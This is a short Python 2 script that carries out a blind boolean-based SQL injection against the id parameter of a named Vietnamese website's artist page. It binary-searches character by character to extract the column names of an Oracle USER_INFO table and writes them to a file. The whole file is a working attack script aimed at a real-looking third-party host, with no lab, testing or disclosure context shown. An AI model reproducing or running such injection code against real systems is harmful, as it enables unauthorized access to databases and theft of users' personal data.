import sys
import urllib
import urllib2
import requests
abslow = 1
abshigh = 127


def checkUrl(row, pos, lower, higher):
    row = str(row)
    pos = str(pos)
    lower = chr(lower)
    higher = chr(higher)
    r = requests.get("http://funring.vn/vn/detail_artist.jsp?id=-1' or \
     substr((select column_name from (select a.*,ROWNUM as rn \
     from (select column_name from all_tab_columns where table_name = 'USER_INFO') a where ROWNUM<1000) \
     where rn="+row+"),"+pos+",1)>'"+lower + "' and substr((select column_name from \
     (select a.*,ROWNUM as rn from (select column_name from all_tab_columns where table_name = 'USER_INFO') a \
     where ROWNUM<1000) where rn="+row+"),"+pos+",1)<'"+higher)
    if "nhatthanh2.jpg" in r.content:
        return True
    else:
        return False



def findChar(row, pos):
    lower = abslow
    higher = abshigh
    while(checkUrl(row,pos, lower, higher)):
        newlower = lower + (higher-lower)//2
        newhigher = higher - (higher-lower)//2
        if(checkUrl(row,pos, lower, newhigher)):
            higher = newhigher
        else:
            lower = newlower
    return chr(lower);

def findStr(row):
    pos = 1
    string = ""
    while(checkUrl(row, pos, abslow, abshigh)):
        string = string + findChar(row, pos)
        pos = pos + 1
    return string

def findAll(colNum):
    file = open("funring_columnname_user.txt","w")
    for i in range (1,colNum):
        string = findStr(i)
        print string
        # file.write(string+'\n')
    file.close()

test = checkUrl(1,1,1,127)
print test
string = findStr(1)
print string
findAll(50)
